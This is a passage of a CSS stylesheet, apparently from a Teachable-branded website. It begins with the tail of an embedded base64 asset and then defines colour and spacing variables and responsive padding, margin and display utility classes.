UWtp97Bbn0Ee1g9wr9qqV/X+4R9nlPX03743dylnaXZyNp8v58yLOsFYCbUnCVQzjN+5QhlmKccO7aMkueWJggROd4qnw2x5LydUcg/NRamE3XMlkGovpRWPKWEavP74P2O1RANM/3gIIPJj7TX+lqU2geQuaBx4B/7cWAOx0ucTiEHYJU9y5DBuUMYNIHeHZz9tn+Fw2G5EBTqUlHRfRi4eB5wNlJsRsv5k4b6HyFkhIC6BO4LzPbWhW7rbCcxubeKHOc6UaBKZBMMd4j8XuRUynOCCa4EMfF9grkI1NcTaSAVtk1nrIOwFfeEBlQw4f4phb6zHzBOm0ZZ0dBcaZRVdYIo5xYiyOMEWONwQHmjKGE//VuRBgul1QrpyxmMvF4vGj0xfuuQrNt4tVTsRhEnjY9AuKa1FVLSEneQWzFd5WbO7hasX08ONUOVQgwQuVqACFXkSoIoUgK1hJEkAgbkG5CjqBS5wrRFuY2IfVwhRnLsVyZTZpatveGR4yEbYqbE6J80nM4aa+LD7Oqmr8PdSJFUQVynmgN4lerGQV1+uLdYzdOFWHPW/iK2gIQayhizQ0NMwyvBEBlrDczRfmU40CTtAHqLQGnjQG8MYkxm1MwJuTqjHwVCu9iRJ1C8ojWGHxUYowH0c5X57zpXquvlw0wzHHGMTfufxiJ1psFJTzq6nGeDvHF4LgmHHWCUViZBaInRn+cswnBi460RBPRYg9TRUQ0CZUC5LAT0qLLu50FpdTeBhjGf7/h4dg9hE0uqsBx/saOcYRDIfnOhfzGFBHyizcJK3p2edUjWrC0rn1aGjXtfVUCHMAKKhlxV8eTEIcV2jCOdKiqahv/MisrfRQVnxPJoOU62mR6pu2ZllIzo8zOZqQB7kWJXW2/c0aihata5PcIVJKfFRgHAETmEQVTCELptGMGcyigTnMJ1voUVN6uCZS9pV2hrwl7FYMvBwtUSd7L7E5qP9t7BIPRF7EcmA9ct2nIPHrxgWajtDltbXuBLuaY6qRZGa5ZlX5anfR0lYXaHUzVSFjZa8rfdhZ8rKXFZg21LVL5LFjI5TlDIbwnFGHE2dypHs6Q50N015dpOgLONEUlOqoiQgIaeCsjMq9gITDKwRMieQgKUy9UQY1BTFYZU2KpE2SkILMIjW8IdFwIKmMaK8oClJVssAEtFnz5dQ1s+w6EZoNGtPGQfzx+aoE8ikiP8GCYOWtgB+HBdWDaxACAZInVq14dZI85RRDvZGIghyONw59KV/BBEQ02P1ER8hmNGiURT2hQP8WfAY="); }


:root { --color-blue-10:#eff4ff; --color-blue-20:#dfe9ff; --color-blue-80:#80a5ff; --color-blue-100:#608fff; --color-blue-120:#4d72cc; --color-blue-140:#3a5699; --color-brand-primary-40:#a6ebd7; --color-brand-primary-60:#7ae1c4; --color-brand-primary-80:#4dd7b0; --color-brand-primary-100:#21cd9c; --color-brand-primary-120:#1aa47d; --color-brand-primary-140:#147b5e; --color-brand-primary-160:#0d523e; --color-green-10:#ebf8ef; --color-green-20:#d7f1df; --color-green-80:#60c87f; --color-green-100:#38ba5f; --color-green-120:#2d954c; --color-green-140:#227039; --color-grey-3:#f8f8f8; --color-grey-6:#f2f2f2; --color-grey-9:#ebebeb; --color-grey-12:#e4e4e4; --color-grey-20:#d3d3d3; --color-grey-30:#bdbdbd; --color-grey-40:#a7a7a7; --color-grey-50:#919191; --color-grey-60:#7a7a7a; --color-grey-70:#646464; --color-grey-80:#4e4e4e; --color-grey-90:#383838; --color-grey-100:#222; --color-red-10:#fbebeb; --color-red-20:#f7d7d7; --color-red-80:#e16060; --color-red-100:#d93838; --color-red-120:#ae2d2d; --color-red-140:#822222; --color-white:#fff; --color-yellow-10:#fef9e9; --color-yellow-20:#fef4d3; --color-yellow-80:#f9d34d; --color-yellow-100:#f8c821; --color-yellow-120:#c6a01a; --color-yellow-140:#957814; --font-family-display:Reckless-Light; --font-size-10:var(--size-10); --font-size-11:var(--size-11); --font-size-12:var(--size-12); --font-size-14:var(--size-14); --font-size-16:var(--size-16); --font-size-18:var(--size-18); --font-size-24:var(--size-24); --font-size-32:var(--size-32); --font-size-48:var(--size-48); --font-weight-bold:700; --font-weight-light:300; --font-weight-medium:500; --font-weight-regular:400; --font-weight-semibold:600; --letter-spacing-1:1px; --letter-spacing-half:0.5px; --line-height-100:100%; --line-height-125:125%; --line-height-150:150%; --size-2:0.125rem; --size-4:0.25rem; --size-6:0.375rem; --size-8:0.5rem; --size-10:0.625rem; --size-11:0.6875rem; --size-12:0.75rem; --size-14:0.875rem; --size-16:1rem; --size-18:1.125rem; --size-20:1.25rem; --size-22:1.375rem; --size-24:1.5rem; --size-26:1.625rem; --size-28:1.75rem; --size-30:1.875rem; --size-32:2rem; --size-34:2.125rem; --size-36:2.25rem; --size-38:2.375rem; --size-40:2.5rem; --size-48:3rem; --size-60:3.75rem; --size-72:4.5rem; --size-full:100%; --size-half:50%; --size-quarter:25%; --spacing-2:var(--size-2); --spacing-4:var(--size-4); --spacing-8:var(--size-8); --spacing-12:var(--size-12); --spacing-16:var(--size-16); --spacing-20:var(--size-20); --spacing-24:var(--size-24); --spacing-32:var(--size-32); --spacing-40:var(--size-40); --spacing-48:var(--size-48); --spacing-60:var(--size-60); --spacing-72:var(--size-72); --goat-milk:#f8faf4; --celadon:#c8e3d8; --deep-emerald:#1b4942; --black:#000; --obsidian:#222; --iron-ore:#494949; --ash:#717171; --nantucket:#b0b0b0; --gravel:#e3e3e3; --linen:#fafafa; --white:#fff; --lagoon:#16b88a; --teachable-green:#21cd9c; --neon-green:#18eaae; --vintage-mint:#d7f3eb; --air-plant:#eafaf3; --cinnabar:#bf1515; --pomegranate:#d93838; --coral-red:#ff4e4e; --carnation:#ffe0e0; --petal-pink:#fff3f3; --cornflower-blue:#608fff; --chefchaouen:#84a9ff; --cascade:#b9cdff; --purple-haze:#dde7fe; --summer-breeze:#f1f5ff; --corn:#ecb800; --candlelight:#f8c821; --school-bus:#ffdb5e; --buttermilk:#ffeec3; --vanilla-wafer:#fff7dc; --evergreen:#004d40; --pine:#00746a; --green-machine:#009689; --money:#1ea69a; --matcha:#20bdaf; --caribbean:#52dccb; --seafoam:#b7f1ea; --minty-fresh:#dffff9; --sage:#f1fffc; --toothpaste:#f9fefd; --poppy:#e9573d; --melon:#f17e69; --peach:#ffb393; --apricat:#fbebe0; --sun-kissed:#fff6f0; --sunshine-daisy:#ffad00; --lemon-meringue:#ffc525; --yellow-submarine:#ffdd80; --butter:#ffeab2; --zest:#fff7e0; --royal:#204bbf; --cobalt:#1f6cde; --whale:#0f9fff; --dreamy:#91d0ff; --icy:#f4faff; --pillows:#e4f4ff; --regal:#2021ab; --grape:#4c3edc; --snozzberry:#6172e9; --lavender:#b1c1f8; --purple-rain:#eeefff; --red-carpet:#b30000; --red-herring:#c00; --rose:#fcc; --tickled-pink:#ffe5e5; --blush:#fff5f5; --squid-ink:#212338; --midnight:#292c44; --dark-and-stormy:#343854; --plumette:#4a4e6d; --slate:#6b6d7c; --nebulous:#9294a0; --concrete:#b9b9c0; --magic:#cbcbd0; --grey-area:#e2e2e9; --subtle:#efeff5; --fog:#f5f5f8; --cloud:#f9fafd; --clinical:#fff; }

html body .visually-hidden { height: 1px; width: 1px; overflow: hidden; clip: rect(1px, 1px, 1px, 1px); position: absolute !important; }

html body .v-middle { vertical-align: middle; }

html body .dsp-block-xs { display: block; }

html body .dsp-inline-xs { display: inline; }

html body .dsp-inline-block-xs { display: inline-block; }

html body .dsp-table-cell-xs { display: table-cell; }

html body .dsp-inline-flex-xs { display: inline-flex; }

html body .dsp-none-xs { display: none; }

html body .text-left-xs { text-align: left; }

html body .text-right-xs { text-align: right; }

html body .text-center-xs { text-align: center; }

html body .float-left-xs { float: left; }

html body .float-right-xs { float: right; }

html body .float-none-xs { float: none; }

html body .p-t-0-xs { padding-top: 0px; }

html body .p-r-0-xs { padding-right: 0px; }

html body .p-b-0-xs { padding-bottom: 0px; }

html body .p-l-0-xs { padding-left: 0px; }

html body .p-h-0-xs { padding-left: 0px; padding-right: 0px; }

html body .p-v-0-xs { padding-top: 0px; padding-bottom: 0px; }

html body .p-0-xs { padding: 0px; }

html body .m-t-0-xs { margin-top: 0px; }

html body .m-r-0-xs { margin-right: 0px; }

html body .m-b-0-xs { margin-bottom: 0px; }

html body .m-l-0-xs { margin-left: 0px; }

html body .m-h-0-xs { margin-left: 0px; margin-right: 0px; }

html body .m-v-0-xs { margin-top: 0px; margin-bottom: 0px; }

html body .p-t-1-xs { padding-top: 4px; }

html body .p-r-1-xs { padding-right: 4px; }

html body .p-b-1-xs { padding-bottom: 4px; }

html body .p-l-1-xs { padding-left: 4px; }

html body .p-h-1-xs { padding-left: 4px; padding-right: 4px; }

html body .p-v-1-xs { padding-top: 4px; padding-bottom: 4px; }

html body .p-1-xs { padding: 4px; }

html body .m-t-1-xs { margin-top: 4px; }

html body .m-r-1-xs { margin-right: 4px; }

html body .m-b-1-xs { margin-bottom: 4px; }

html body .m-l-1-xs { margin-left: 4px; }

html body .m-h-1-xs { margin-left: 4px; margin-right: 4px; }

html body .m-v-1-xs { margin-top: 4px; margin-bottom: 4px; }

html body .p-t-2-xs { padding-top: 8px; }

html body .p-r-2-xs { padding-right: 8px; }

html body .p-b-2-xs { padding-bottom: 8px; }

html body .p-l-2-xs { padding-left: 8px; }

html body .p-h-2-xs { padding-left: 8px; padding-right: 8px; }

html body .p-v-2-xs { padding-top: 8px; padding-bottom: 8px; }

html body .p-2-xs { padding: 8px; }

html body .m-t-2-xs { margin-top: 8px; }

html body .m-r-2-xs { margin-right: 8px; }

html body .m-b-2-xs { margin-bottom: 8px; }

html body .m-l-2-xs { margin-left: 8px; }

html body .m-h-2-xs { margin-left: 8px; margin-right: 8px; }

html body .m-v-2-xs { margin-top: 8px; margin-bottom: 8px; }

html body .p-t-3-xs { padding-top: 16px; }

html body .p-r-3-xs { padding-right: 16px; }

html body .p-b-3-xs { padding-bottom: 16px; }

html body .p-l-3-xs { padding-left: 16px; }

html body .p-h-3-xs { padding-left: 16px; padding-right: 16px; }

html body .p-v-3-xs { padding-top: 16px; padding-bottom: 16px; }

html body .p-3-xs { padding: 16px; }

html body .m-t-3-xs { margin-top: 16px; }

html body .m-r-3-xs { margin-right: 16px; }

html body .m-b-3-xs { margin-bottom: 16px; }

html body .m-l-3-xs { margin-left: 16px; }

html body .m-h-3-xs { margin-left: 16px; margin-right: 16px; }

html body .m-v-3-xs { margin-top: 16px; margin-bottom: 16px; }

html body .p-t-4-xs { padding-top: 24px; }

html body .p-r-4-xs { padding-right: 24px; }

html body .p-b-4-xs { padding-bottom: 24px; }

html body .p-l-4-xs { padding-left: 24px; }

html body .p-h-4-xs { padding-left: 24px; padding-right: 24px; }

html body .p-v-4-xs { padding-top: 24px; padding-bottom: 24px; }

html body .p-4-xs { padding: 24px; }

html body .m-t-4-xs { margin-top: 24px; }

html body .m-r-4-xs { margin-right: 24px; }

html body .m-b-4-xs { margin-bottom: 24px; }

html body .m-l-4-xs { margin-left: 24px; }

html body .m-h-4-xs { margin-left: 24px; margin-right: 24px; }

html body .m-v-4-xs { margin-top: 24px; margin-bottom: 24px; }

html body .p-t-5-xs { padding-top: 32px; }

html body .p-r-5-xs { padding-right: 32px; }

html body .p-b-5-xs { padding-bottom: 32px; }

html body .p-l-5-xs { padding-left: 32px; }

html body .p-h-5-xs { padding-left: 32px; padding-right: 32px; }

html body .p-v-5-xs { padding-top: 32px; padding-bottom: 32px; }

html body .p-5-xs { padding: 32px; }

html body .m-t-5-xs { margin-top: 32px; }

html body .m-r-5-xs { margin-right: 32px; }

html body .m-b-5-xs { margin-bottom: 32px; }

html body .m-l-5-xs { margin-left: 32px; }

html body .m-h-5-xs { margin-left: 32px; margin-right: 32px; }

html body .m-v-5-xs { margin-top: 32px; margin-bottom: 32px; }

html body .p-t-6-xs { padding-top: 40px; }

html body .p-r-6-xs { padding-right: 40px; }

html body .p-b-6-xs { padding-bottom: 40px; }

html body .p-l-6-xs { padding-left: 40px; }

html body .p-h-6-xs { padding-left: 40px; padding-right: 40px; }

html body .p-v-6-xs { padding-top: 40px; padding-bottom: 40px; }

html body .p-6-xs { padding: 40px; }

html body .m-t-6-xs { margin-top: 40px; }

html body .m-r-6-xs { margin-right: 40px; }

html body .m-b-6-xs { margin-bottom: 40px; }

html body .m-l-6-xs { margin-left: 40px; }

html body .m-h-6-xs { margin-left: 40px; margin-right: 40px; }

html body .m-v-6-xs { margin-top: 40px; margin-bottom: 40px; }

html body .p-t-7-xs { padding-top: 64px; }

html body .p-r-7-xs { padding-right: 64px; }

html body .p-b-7-xs { padding-bottom: 64px; }

html body .p-l-7-xs { padding-left: 64px; }

html body .p-h-7-xs { padding-left: 64px; padding-right: 64px; }

html body .p-v-7-xs { padding-top: 64px; padding-bottom: 64px; }

html body .p-7-xs { padding: 64px; }

html body .m-t-7-xs { margin-top: 64px; }

html body .m-r-7-xs { margin-right: 64px; }

html body .m-b-7-xs { margin-bottom: 64px; }

html body .m-l-7-xs { margin-left: 64px; }

html body .m-h-7-xs { margin-left: 64px; margin-right: 64px; }

html body .m-v-7-xs { margin-top: 64px; margin-bottom: 64px; }

html body .m-t-auto-xs { margin-top: auto; }

html body .m-r-auto-xs { margin-right: auto; }

html body .m-b-auto-xs { margin-bottom: auto; }

html body .m-l-auto-xs { margin-left: auto; }

html body .m-auto-xs { margin: auto; }

@media only screen and (min-width: 415px) {
  html body .dsp-block-s { display: block; }
  html body .dsp-inline-s { display: inline; }
  html body .dsp-inline-block-s { display: inline-block; }
  html body .dsp-table-cell-s { display: table-cell; }
  html body .dsp-inline-flex-s { display: inline-flex; }
  html body .dsp-none-s { display: none; }
  html body .text-left-s { text-align: left; }
  html body .text-right-s { text-align: right; }
  html body .text-center-s { text-align: center; }
  html body .float-left-s { float: left; }
  html body .float-right-s { float: right; }
  html body .float-none-s { float: none; }
  html body .p-t-0-s { padding-top: 0px; }
  html body .p-r-0-s { padding-right: 0px; }
  html body .p-b-0-s { padding-bottom: 0px; }
  html body .p-l-0-s { padding-left: 0px; }
  html body .p-h-0-s { padding-left: 0px; padding-right: 0px; }
  html body .p-v-0-s { padding-top: 0px; padding-bottom: 0px; }
  html body .p-0-s { padding: 0px; }
  html body .m-t-0-s { margin-top: 0px; }
  html body .m-r-0-s { margin-right: 0px; }
  html body .m-b-0-s { margin-bottom: 0px; }
  html body .m-l-0-s { margin-left: 0px; }
  html body .m-h-0-s { margin-left: 0px; margin-right: 0px; }
  html body .m-v-0-s { margin-top: 0px; margin-bottom: 0px; }
  html body .p-t-1-s { padding-top: 4px; }
  html body .p-r-1-s { padding-right: 4px; }
  html body .p-b-1-s { padding-bottom: 4px; }
  html body .p-l-1-s { padding-left: 4px; }
  html body .p-h-1-s { padding-left: 4px; padding-right: 4px; }
  html body .p-v-1-s { padding-top: 4px; padding-bottom: 4px; }
  html body .p-1-s { padding: 4px; }
  html body .m-t-1-s { margin-top: 4px; }
  html body .m-r-1-s { margin-right: 4px; }
  html body .m-b-1-s { margin-bottom: 4px; }
  html body .m-l-1-s { margin-left: 4px; }
  html body .m-h-1-s { margin-left: 4px; margin-right: 4px; }
  html body .m-v-1-s { margin-top: 4px; margin-bottom: 4px; }
  html body .p-t-2-s { padding-top: 8px; }
  html body .p-r-2-s { padding-right: 8px; }
  html body .p-b-2-s { padding-bottom: 8px; }
  html body .p-l-2-s { padding-left: 8px; }
  html body .p-h-2-s { padding-left: 8px; padding-right: 8px; }
  html body .p-v-2-s { padding-top: 8px; padding-bottom: 8px; }
  html body .p-2-s { padding: 8px; }
  html body .m-t-2-s { margin-top: 8px; }
  html body .m-r-2-s { margin-right: 8px; }
  html body .m-b-2-s { margin-bottom: 8px; }
  html body .m-l-2-s { margin-left: 8px; }
  html body .m-h-2-s { margin-left: 8px; margin-right: 8px; }
  html body .m-v-2-s { margin-top: 8px; margin-bottom: 8px; }
  html body .p-t-3-s { padding-top: 16px; }
  html body .p-r-3-s { padding-right: 16px; }
  html body .p-b-3-s { padding-bottom: 16px; }
  html body .p-l-3-s { padding-left: 16px; }
  html body .p-h-3-s { padding-left: 16px; padding-right: 16px; }
  html body .p-v-3-s { padding-top: 16px; padding-bottom: 16px; }
  html body .p-3-s { padding: 16px; }
  html body .m-t-3-s { margin-top: 16px; }
  html body .m-r-3-s { margin-right: 16px; }
  html body .m-b-3-s { margin-bottom: 16px; }
  html body .m-l-3-s { margin-left: 16px; }
  html body .m-h-3-s { margin-left: 16px; margin-right: 16px; }
  html body .m-v-3-s { margin-top: 16px; margin-bottom: 16px; }
  html body .p-t-4-s { padding-top: 24px; }
  html body .p-r-4-s { padding-right: 24px; }
  html body .p-b-4-s { padding-bottom: 24px; }
  html body .p-l-4-s { padding-left: 24px; }
  html body .p-h-4-s { padding-left: 24px; padding-right: 24px; }
  html body .p-v-4-s { padding-top: 24px; padding-bottom: 24px; }
  html body .p-4-s { padding: 24px; }
  html body .m-t-4-s { margin-top: 24px; }
  html body .m-r-4-s { margin-right: 24px; }
  html body .m-b-4-s { margin-bottom: 24px; }
  html body .m-l-4-s { margin-left: 24px; }
  html body .m-h-4-s { margin-left: 24px; margin-right: 24px; }
  html body .m-v-4-s { margin-top: 24px; margin-bottom: 24px; }
  html body .p-t-5-s { padding-top: 32px; }
  html body .p-r-5-s { padding-right: 32px; }
  html body .p-b-5-s { padding-bottom: 32px; }
  html body .p-l-5-s { padding-left: 32px; }
  html body .p-h-5-s { padding-left: 32px; padding-right: 32px; }
  html body .p-v-5-s { padding-top: 32px; padding-bottom: 32px; }
  html body .p-5-s { padding: 32px; }
  html body .m-t-5-s { margin-top: 32px; }
  html body .m-r-5-s { margin-right: 32px; }
  html body .m-b-5-s { margin-bottom: 32px; }
  html body .m-l-5-s { margin-left: 32px; }
  html body .m-h-5-s { margin-left: 32px; margin-right: 32px; }
  html body .m-v-5-s { margin-top: 32px; margin-bottom: 32px; }
  html body .p-t-6-s { padding-top: 40px; }
  html body .p-r-6-s { padding-right: 40px; }
  html body .p-b-6-s { padding-bottom: 40px; }
  html body .p-l-6-s { padding-left: 40px; }
  html body .p-h-6-s { padding-left: 40px; padding-right: 40px; }
  html body .p-v-6-s { padding-top: 40px; padding-bottom: 40px; }
  html body .p-6-s { padding: 40px; }
  html body .m-t-6-s { margin-top: 40px; }
  html body .m-r-6-s { margin-right: 40px; }
  html body .m-b-6-s { margin-bottom: 40px; }
  html body .m-l-6-s { margin-left: 40px; }
  html body .m-h-6-s { margin-left: 40px; margin-right: 40px; }
  html body .m-v-6-s { margin-top: 40px; margin-bottom: 40px; }
  html body .p-t-7-s { padding-top: 64px; }
  html body .p-r-7-s { padding-right: 64px; }
  html body .p-b-7-s { padding-bottom: 64px; }
  html body .p-l-7-s { padding-left: 64px; }
  html body .p-h-7-s { padding-left: 64px; padding-right: 64px; }
  html body .p-v-7-s { padding-top: 64px; padding-bottom: 64px; }
  html body .p-7-s { padding: 64px; }
  html body .m-t-7-s { margin-top: 64px; }
  html body .m-r-7-s { margin-right: 64px; }
  html body .m-b-7-s { margin-bottom: 64px; }
  html body .m-l-7-s { margin-left: 64px; }
  html body .m-h-7-s { margin-left: 64px; margin-right: 64px; }
  html body .m-v-7-s { margin-top: 64px; margin-bottom: 64px; }
  html body .m-t-auto-s { margin-top: auto; }
  html body .m-r-auto-s { margin-right: auto; }
  html body .m-b-auto-s { margin-bottom: auto; }
  html body .m-l-auto-s { margin-left: auto; }
  html body .m-auto-s { margin: auto; }
}

@media only screen and (min-width: 768px) {
  html body .dsp-block-m { display: block; }
  html body .dsp-inline-m { display: inline; }
  html body .dsp-inline-block-m { display: inline-block; }
  html body .dsp-table-cell-m { display: table-cell; }
  html body .dsp-inline-flex-m { display: inline-flex; }
  html body .dsp-none-m { display: none; }
  html body .text-left-m { text-align: left; }
  html body .text-right-m { text-align: right; }
  html body .text-center-m { text-align: center; }
  html body .float-left-m { float: left; }
  html body .float-right-m { float: right; }
  html body .float-none-m { float: none; }
  html body .p-t-0-m { padding-top: 0px; }
  html body .p-r-0-m { padding-right: 0px; }
  html body .p-b-0-m { padding-bottom: 0px; }
  html body .p-l-0-m { padding-left: 0px; }
  html body .p-h-0-m { padding-left: 0px; padding-right: 0px; }
  html body .p-v-0-m { padding-top: 0px; padding-bottom: 0px; }
  html body .p-0-m { padding: 0px; }
  html body .m-t-0-m { margin-top: 0px; }
  html body .m-r-0-m { margin-right: 0px; }
  html body .m-b-0-m { margin-bottom: 0px; }
  html body .m-l-0-m { margin-left: 0px; }
  html body .m-h-0-m { margin-left: 0px; margin-right: 0px; }
  html body .m-v-0-m { margin-top: 0px; margin-bottom: 0px; }
  html body .p-t-1-m { padding-top: 4px; }
  html body .p-r-1-m { padding-right: 4px; }
  html body .p-b-1-m { padding-bottom: 4px; }
  html body .p-l-1-m { padding-left: 4px; }
  html body .p-h-1-m { padding-left: 4px; padding-right: 4px; }
  html body .p-v-1-m { padding-top: 4px; padding-bottom: 4px; }
  html body .p-1-m { padding: 4px; }
  html body .m-t-1-m { margin-top: 4px; }
  html body .m-r-1-m { margin-right: 4px; }
  html body .m-b-1-m { margin-bottom: 4px; }
  html body .m-l-1-m { margin-left: 4px; }
  html body .m-h-1-m { margin-left: 4px; margin-right: 4px; }
  html body .m-v-1-m { margin-top: 4px; margin-bottom: 4px; }
  html body .p-t-2-m { padding-top: 8px; }
  html body .p-r-2-m { padding-right: 8px; }
  html body .p-b-2-m { padding-bottom: 8px; }
  html body .p-l-2-m { padding-left: 8px; }
  html body .p-h-2-m { padding-left: 8px; padding-right: 8px; }
  html body .p-v-2-m { padding-top: 8px; padding-bottom: 8px; }
  html body .p-2-m { padding: 8px; }
  html body .m-t-2-m { margin-top: 8px; }
  html body .m-r-2-m { margin-right: 8px; }
  html body .m-b-2-m { margin-bottom: 8px; }
  html body .m-l-2-m { margin-left: 8px; }
  html body .m-h-2-m { margin-left: 8px; margin-right: 8px; }
  html body .m-v-2-m { margin-top: 8px; margin-bottom: 8px; }
  html body .p-t-3-m { padding-top: 16px; }
  html body .p-r-3-m { padding-right: 16px; }
  html body .p-b-3-m { padding-bottom: 16px; }
  html body .p-l-3-m { padding-left: 16px; }
  html body .p-h-3-m { padding-left: 16px; padding-right: 16px; }
  html body .p-v-3-m { padding-top: 16px; padding-bottom: 16px; }
  html body .p-3-m { padding: 16px; }
  html body .m-t-3-m { margin-top: 16px; }
  html body .m-r-3-m { margin-right: 16px; }
  html body .m-b-3-m { margin-bottom: 16px; }
  html body .m-l-3-m { margin-left: 16px; }
  html body .m-h-3-m { margin-left: 16px; margin-right: 16px; }
  html body .m-v-3-m { margin-top: 16px; margin-bottom: 16px; }
  html body .p-t-4-m { padding-top: 24px; }
  html body .p-r-4-m { padding-right: 24px; }
  html body .p-b-4-m { padding-bottom: 24px; }
  html body .p-l-4-m { padding-left: 24px; }
  html body .p-h-4-m { padding-left: 24px; padding-right: 24px; }
  html body .p-v-4-m { padding-top: 24px; padding-bottom: 24px; }
  html body .p-4-m { padding: 24px; }
  html body .m-t-4-m { margin-top: 24px; }
  html body .m-r-4-m { margin-right: 24px; }
  html body .m-b-4-m { margin-bottom: 24px; }
  html body .m-l-4-m { margin-left: 24px; }
  html body .m-h-4-m { margin-left: 24px; margin-right: 24px; }
  html body .m-v-4-m { margin-top: 24px; margin-bottom: 24px; }
  html body .p-t-5-m { padding-top: 32px; }
  html body .p-r-5-m { padding-right: 32px; }
  html body .p-b-5-m { padding-bottom: 32px; }
  html body .p-l-5-m { padding-left: 32px; }
  html body .p-h-5-m { padding-left: 32px; padding-right: 32px; }
  html body .p-v-5-m { padding-top: 32px; padding-bottom: 32px; }
  html body .p-5-m { padding: 32px; }
  html body .m-t-5-m { margin-top: 32px; }
  html body .m-r-5-m { margin-right: 32px; }
  html body .m-b-5-m { margin-bottom: 32px; }
  html body .m-l-5-m { margin-left: 32px; }
  html body .m-h-5-m { margin-left: 32px; margin-right: 32px; }
  html body .m-v-5-m { margin-top: 32px; margin-bottom: 32px; }
  html body .p-t-6-m { padding-top: 40px; }
  html body .p-r-6-m { padding-right: 40px; }
  html body .p-b-6-m { padding-bottom: 40px; }
  html body .p-l-6-m { padding-left: 40px; }
  html body .p-h-6-m { padding-left: 40px; padding-right: 40px; }
  html body .p-v-6-m { padding-top: 40px; padding-bottom: 40px; }
  html body .p-6-m { padding: 40px; }
  html body .m-t-6-m { margin-top: 40px; }
  html body .m-r-6-m { margin-right: 40px; }
  html body .m-b-6-m { margin-bottom: 40px; }
  html body .m-l-6-m { margin-left: 40px; }
  html body .m-h-6-m { margin-left: 40px; margin-right: 40px; }
  html body .m-v-6-m { margin-top: 40px; margin-bottom: 40px; }
  html body .p-t-7-m { padding-top: 64px; }
  html body .p-r-7-m { padding-right: 64px; }
  html body .p-b-7-m { padding-bottom: 64px; }
  html body .p-l-7-m { padding-left: 64px; }
  html body .p-h-7-m { padding-left: 64px; padding-right: 64px; }
  html body .p-v-7-m { padding-top: 64px; padding-bottom: 64px; }
  html body .p-7-m { padding: 64px; }
  html body .m-t-7-m { margin-top: 64px; }
  html body .m-r-7-m { margin-right: 64px; }
  html body .m-b-7-m { margin-bottom: 64px; }
  html body .m-l-7-m { margin-left: 64px; }
  html body .m-h-7-m { margin-left: 64px; margin-right: 64px; }
  html body .m-v-7-m { margin-top: 64px; margin-bottom: 64px; }
  html body .m-t-auto-m { margin-top: auto; }
  html body .m-r-auto-m { margin-right: auto; }
  html body .m-b-auto-m { margin-bottom: auto; }
  html body .m-l-auto-m { margin-left: auto; }
  html body .m-auto-m { margin: auto; }
}

@media only screen and (min-width: 1024px) {
  html body .dsp-block-l { display: block; }
  html body .dsp-inline-l { display: inline; }
  html body .dsp-inline-block-l { display: inline-block; }
  html body .dsp-table-cell-l { display: table-cell; }
  html body .dsp-inline-flex-l { display: inline-flex; }
  html body .dsp-none-l { display: none; }
  html body .text-left-l { text-align: left; }
  html body .text-right-l { text-align: right; }
  html body .text-center-l { text-align: center; }
  html body .float-left-l { float: left; }
  html body .float-right-l { float: right; }
  html body .float-none-l { float: none; }
  html body .p-t-0-l { padding-top: 0px; }
  html body .p-r-0-l { padding-right: 0px; }
  html body .p-b-0-l { padding-bottom: 0px; }
  html body .p-l-0-l { padding-left: 0px; }
  html body .p-h-0-l { padding-left: 0px; padding-right: 0px; }
  html body .p-v-0-l { padding-top: 0px; padding-bottom: 0px; }
  html body .p-0-l { padding: 0px; }
  html body .m-t-0-l { margin-top: 0px; }
  html body .m-r-0-l { margin-right: 0px; }
  html body .m-b-0-l { margin-bottom: 0px; }
  html body .m-l-0-l { margin-left: 0px; }
  html body .m-h-0-l { margin-left: 0px; margin-right: 0px; }
  html body .m-v-0-l { margin-top: 0px; margin-bottom: 0px; }
  html body .p-t-1-l { padding-top: 4px; }
  html body .p-r-1-l { padding-right: 4px; }
  html body .p-b-1-l { padding-bottom: 4px; }
  html body .p-l-1-l { padding-left: 4px; }
  html body .p-h-1-l { padding-left: 4px; padding-right: 4px; }
  html body .p-v-1-l { padding-top: 4px; padding-bottom: 4px; }
  html body .p-1-l { padding: 4px; }
  html body .m-t-1-l { margin-top: 4px; }
  html body .m-r-1-l { margin-right: 4px; }
  html body .m-b-1-l { margin-bottom: 4px; }
  html body .m-l-1-l { margin-left: 4px; }
  html body .m-h-1-l { margin-left: 4px; margin-right: 4px; }
  html body .m-v-1-l { margin-top: 4px; margin-bottom: 4px; }
  html body .p-t-2-l { padding-top: 8px; }
  html body .p-r-2-l { padding-right: 8px; }
  html body .p-b-2-l { padding-bottom: 8px; }
  html body .p-l-2-l { padding-left: 8px; }
  html body .p-h-2-l { padding-left: 8px; padding-right: 8px; }
  html body .p-v-2-l { padding-top: 8px; padding-bottom: 8px; }
  html body .p-2-l { padding: 8px; }
  html body .m-t-2-l { margin-top: 8px; }
  html body .m-r-2-l { margin-right: 8px; }
  html body .m-b-2-l { margin-bottom: 8px; }
  html body .m-l-2-l { margin-left: 8px; }
  html body .m-h-2-l { margin-left: 8px; margin-right: 8px; }
  html body .m-v-2-l { margin-top: 8px; margin-bottom: 8px; }
  html body .p-t-3-l { padding-top: 16px; }
  html body .p-r-3-l { padding-right: 16px; }
  html body .p-b-3-l { padding-bottom: 16px; }
  html body .p-l-3-l { padding-left: 16px; }
  html body .p-h-3-l { padding-left: 16px; padding-right: 16px; }
  html body .p-v-3-l { padding-top: 16px; padding-bottom: 16px; }
  html body .p-3-l { padding: 16px; }
  html body .m-t-3-l { margin-top: 16px; }
  html body .m-r-3-l { margin-right: 16px; }
  html body .m-b-3-l { margin-bottom: 16px; }
  html body .m-l-3-l { margin-left: 16px; }
  html body .m-h-3-l { margin-left: 16px; margin-right: 16px; }
  html body .m-v-3-l { margin-top: 16px; margin-bottom: 16px; }
  html body .p-t-4-l { padding-top: 24px; }
  html body .p-r-4-l { padding-right: 24px; }
  html body .p-b-4-l { padding-bottom: 24px; }
  html body .p-l-4-l { padding-left: 24px; }
  html body .p-h-4-l { padding-left: 24px; padding-right: 24px; }
  html body .p-v-4-l { padding-top: 24px; padding-bottom: 24px; }
  html body .p-4-l { padding: 24px; }
  html body .m-t-4-l { margin-top: 24px; }
  html body .m-r-4-l { margin-right: 24px; }
  html body .m-b-4-l { margin-bottom: 24px; }
  html body .m-l-4-l { margin-left: 24px; }
  html body .m-h-4-l { margin-left: 24px; margin-right: 24px; }
  html body .m-v-4-l { margin-top: 24px; margin-bottom: 24px; }
  html body .p-t-5-l { padding-top: 32px; }
  html body .p-r-5-l { padding-right: 32px; }
  html body .p-b-5-l { padding-bottom: 32px; }
  html body .p-l-5-l { padding-left: 32px; }
  html body .p-h-5-l { padding-left: 32px; padding-right: 32px; }
  html body .p-v-5-l { padding-top: 32px; padding-bottom: 32px; }
  html body .p-5-l { padding: 32px; }
